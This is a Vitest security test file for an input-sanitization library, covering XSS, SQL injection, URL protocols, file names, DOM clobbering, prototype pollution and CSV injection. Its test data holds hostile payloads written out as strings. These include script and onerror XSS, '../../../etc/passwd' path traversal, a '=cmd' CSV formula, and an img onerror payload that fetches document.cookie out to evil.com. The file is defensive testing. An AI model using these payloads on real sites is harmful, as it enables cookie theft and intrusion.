// Security Tests - Validates XSS protection, SQL injection prevention, and input validation
// Run with: npm test (after adding test runner)

import { describe, it, expect } from 'vitest';
import {
  sanitizeHtml,
  sanitizeStrict,
  sanitizeText,
  sanitizeUrl,
  sanitizeSearchQuery,
  sanitizeFileName,
  containsXSS,
  containsSQLInjection,
} from '../lib/sanitize';

describe('Security Tests', () => {
  describe('XSS Prevention', () => {
    it('should remove script tags', () => {
      const dirty = '<script>alert("XSS")</script><p>Hello</p>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('<script>');
      expect(clean).toContain('Hello');
    });

    it('should remove event handlers', () => {
      const dirty = '<div onclick="alert(\'XSS\')">Click me</div>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('onclick');
    });

    it('should remove javascript: protocol', () => {
      const dirty = '<a href="javascript:alert(\'XSS\')">Click</a>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('javascript:');
    });

    it('should remove data: protocol for images', () => {
      const dirty = '<img src="data:text/html,<script>alert(\'XSS\')</script>">';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('data:');
    });

    it('should remove iframe tags', () => {
      const dirty = '<iframe src="evil.com"></iframe><p>Content</p>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('<iframe>');
      expect(clean).toContain('Content');
    });

    it('should handle complex nested XSS', () => {
      const dirty = '<div><img src=x onerror="alert(\'XSS\')"><script>evil()</script></div>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('<script>');
    });

    it('should handle nested script tags (bypass attempt)', () => {
      const dirty = '<script><script>alert("XSS")</script></script>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert');
    });

    it('should handle malformed script end tags with spaces', () => {
      const dirty = '<script>alert("XSS")</script >';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert');
    });

    it('should handle nested iframe tags (bypass attempt)', () => {
      const dirty = '<iframe><iframe src="evil.com"></iframe></iframe>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('<iframe>');
      expect(clean).not.toContain('evil.com');
    });

    it('should iteratively remove all dangerous content', () => {
      const dirty = '<<script>script>alert("XSS")<</script>/script>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert');
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should detect SQL injection patterns', () => {
      expect(containsSQLInjection("' OR '1'='1")).toBe(true);
      expect(containsSQLInjection('SELECT * FROM users')).toBe(true);
      expect(containsSQLInjection('DROP TABLE users')).toBe(true);
      expect(containsSQLInjection('-- comment')).toBe(true);
      expect(containsSQLInjection('/* comment */')).toBe(true);
    });

    it('should allow safe queries', () => {
      expect(containsSQLInjection('normal search term')).toBe(false);
      expect(containsSQLInjection('João Silva')).toBe(false);
      expect(containsSQLInjection('user@email.com')).toBe(false);
    });

    it('should sanitize search queries', () => {
      const malicious = "'; DROP TABLE users; --";
      const clean = sanitizeSearchQuery(malicious);
      expect(clean).not.toContain(';');
      expect(clean).not.toContain('--');
      expect(clean).not.toContain("'");
    });
  });

  describe('URL Sanitization', () => {
    it('should block javascript: protocol', () => {
      const malicious = 'javascript:alert("XSS")';
      const clean = sanitizeUrl(malicious);
      expect(clean).toBe('');
    });

    it('should block data: protocol', () => {
      const malicious = 'data:text/html,<script>alert("XSS")</script>';
      const clean = sanitizeUrl(malicious);
      expect(clean).toBe('');
    });

    it('should block vbscript: protocol', () => {
      const malicious = 'vbscript:msgbox("XSS")';
      const clean = sanitizeUrl(malicious);
      expect(clean).toBe('');
    });

    it('should block file: protocol', () => {
      const malicious = 'file:///etc/passwd';
      const clean = sanitizeUrl(malicious);
      expect(clean).toBe('');
    });

    it('should allow https URLs', () => {
      const safe = 'https://example.com/page';
      const clean = sanitizeUrl(safe);
      expect(clean).toBe(safe);
    });

    it('should allow relative URLs', () => {
      const safe = '/path/to/page';
      const clean = sanitizeUrl(safe);
      expect(clean).toBe(safe);
    });

    it('should auto-add https to URLs without protocol', () => {
      const url = 'example.com';
      const clean = sanitizeUrl(url);
      expect(clean).toBe('https://example.com');
    });
  });

  describe('File Name Sanitization', () => {
    it('should prevent path traversal', () => {
      const malicious = '../../../etc/passwd';
      const clean = sanitizeFileName(malicious);
      expect(clean).not.toContain('../');
      expect(clean).not.toContain('etc/passwd');
    });

    it('should remove special characters', () => {
      const malicious = 'file<>name|with:special*chars?.pdf';
      const clean = sanitizeFileName(malicious);
      expect(clean).not.toContain('<');
      expect(clean).not.toContain('>');
      expect(clean).not.toContain('|');
      expect(clean).not.toContain(':');
      expect(clean).not.toContain('*');
    });

    it('should limit length', () => {
      const longName = 'a'.repeat(300) + '.pdf';
      const clean = sanitizeFileName(longName);
      expect(clean.length).toBeLessThanOrEqual(255);
    });
  });

  describe('Text Sanitization', () => {
    it('should remove all HTML tags', () => {
      const html = '<p>Hello <strong>World</strong></p>';
      const clean = sanitizeText(html);
      expect(clean).toBe('Hello World');
      expect(clean).not.toContain('<');
    });

    it('should handle empty input', () => {
      expect(sanitizeText('')).toBe('');
      expect(sanitizeHtml('')).toBe('');
      expect(sanitizeUrl('')).toBe('');
    });
  });

  describe('Strict Sanitization', () => {
    it('should only allow basic formatting', () => {
      const html = '<p>Text with <strong>bold</strong> and <a href="#">link</a></p>';
      const clean = sanitizeStrict(html);
      expect(clean).toContain('<strong>');
      expect(clean).not.toContain('<a');
    });
  });

  describe('XSS Detection', () => {
    it('should detect common XSS patterns', () => {
      expect(containsXSS('<script>')).toBe(true);
      expect(containsXSS('javascript:alert()')).toBe(true);
      expect(containsXSS('data:text/html,<script>')).toBe(true);
      expect(containsXSS('vbscript:msgbox()')).toBe(true);
      expect(containsXSS('onerror=')).toBe(true);
      expect(containsXSS('<iframe>')).toBe(true);
      expect(containsXSS('eval(')).toBe(true);
    });

    it('should not flag safe content', () => {
      expect(containsXSS('Normal text content')).toBe(false);
      expect(containsXSS('<p>Paragraph</p>')).toBe(false);
    });
  });

  describe('Edge Cases', () => {
    it('should handle null and undefined', () => {
      expect(sanitizeHtml(null as any)).toBe('');
      expect(sanitizeHtml(undefined as any)).toBe('');
    });

    it('should handle unicode characters', () => {
      const unicode = '你好世界 こんにちは مرحبا';
      const clean = sanitizeText(unicode);
      expect(clean).toBe(unicode);
    });

    it('should handle mixed content', () => {
      const mixed = 'Text before <script>alert("XSS")</script> text after';
      const clean = sanitizeHtml(mixed);
      expect(clean).toContain('Text before');
      expect(clean).toContain('text after');
      expect(clean).not.toContain('<script>');
    });
  });
});

describe('Input Validation Tests', () => {
  describe('Length Validation', () => {
    it('should truncate long search queries', () => {
      const longQuery = 'a'.repeat(200);
      const clean = sanitizeSearchQuery(longQuery);
      expect(clean.length).toBeLessThanOrEqual(100);
    });
  });

  describe('Character Encoding', () => {
    it('should handle encoded XSS attempts', () => {
      const encoded = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
      const clean = sanitizeHtml(encoded);
      expect(clean).not.toContain('<script>');
    });
  });
});

// Additional security scenarios
describe('Real-World Attack Scenarios', () => {
  it('should prevent stored XSS in comments', () => {
    const userComment = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
    const clean = sanitizeHtml(userComment);
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('fetch');
  });

  it('should prevent DOM clobbering', () => {
    const malicious = '<form name="getElementById"><input name="createElement"></form>';
    const clean = sanitizeHtml(malicious);
    // Should either remove form or remove dangerous attributes
    expect(clean).not.toContain('name="getElementById"');
  });

  it('should prevent prototype pollution in object keys', () => {
    const malicious = '__proto__';
    const clean = sanitizeText(malicious);
    // Should be safe to use as object key
    const obj: Record<string, string> = {};
    obj[clean] = 'value';
    expect(Object.prototype.hasOwnProperty('value')).toBe(false);
  });

  it('should prevent CSV injection', () => {
    const csvPayload = '=cmd|"/c calc"!A1';
    const clean = sanitizeText(csvPayload);
    expect(clean).not.toContain('=cmd');
  });
});
